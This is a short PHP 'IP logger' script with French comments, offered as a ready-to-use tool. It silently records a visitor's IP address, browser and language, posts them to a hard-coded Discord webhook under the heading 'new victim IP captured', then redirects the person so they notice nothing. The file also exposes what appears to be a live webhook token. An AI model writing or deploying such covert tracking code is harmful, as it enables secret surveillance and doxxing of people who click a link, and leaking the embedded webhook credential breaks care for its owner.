<?php
// === CONFIGURATION (à changer une seule fois) ===
$webhook_url = "https://discord.com/api/webhooks/1438558094736097323/7gEfEJ8JyVu9KOAkOVV1G9o3_89-VPoQwcCd1h4X5F_joUD2othf5nO2t46ffB3Q7E2v"; 
// Crée un webhook dans ton serveur Discord → Paramètres du salon → Intégrations → Webhooks → Nouveau webhook → Copier l’URL

$redirect_url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; 
// Change par n’importe quel lien (rickroll, Google, ton vrai site, etc.)
// === FIN DE CONFIGURATION ===

function getRealIp() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        return $_SERVER['HTTP_CF_CONNECTING_IP']; // Cloudflare
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $list = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($list[0]);
    }
    if (!empty($_SERVER['HTTP_X_REAL_IP'])) {
        return $_SERVER['HTTP_X_REAL_IP'];
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Inconnue';
}

$ip = getRealIp();
$useragent = $_SERVER['HTTP_USER_AGENT'] ?? 'Inconnu';
$langue = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'Inconnue';
$heure = date('d/m/Y à H:i:s');

// Envoi sur Discord
$data = json_encode([
    "content" => "**Nouvelle victime IP capturée**",
    "embeds" => [[
        "title" => "IP attrapée",
        "color" => 16711680, // rouge
        "fields" => [
            ["name" => "Adresse IP", "value" => "||$ip||", "inline" => false],
            ["name" => "Heure", "value" => $heure, "inline" => true],
            ["name" => "Navigateur / OS", "value" => "||$useragent||", "inline" => false],
            ["name" => "Langue", "value" => $langue, "inline" => true]
        ],
        "footer" => ["text" => "IP Logger by toi"]
    ]]
]);

$ch = curl_init($webhook_url);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

// Redirection immédiate (la personne ne voit rien)
header("Location: $redirect_url");
exit();
?>
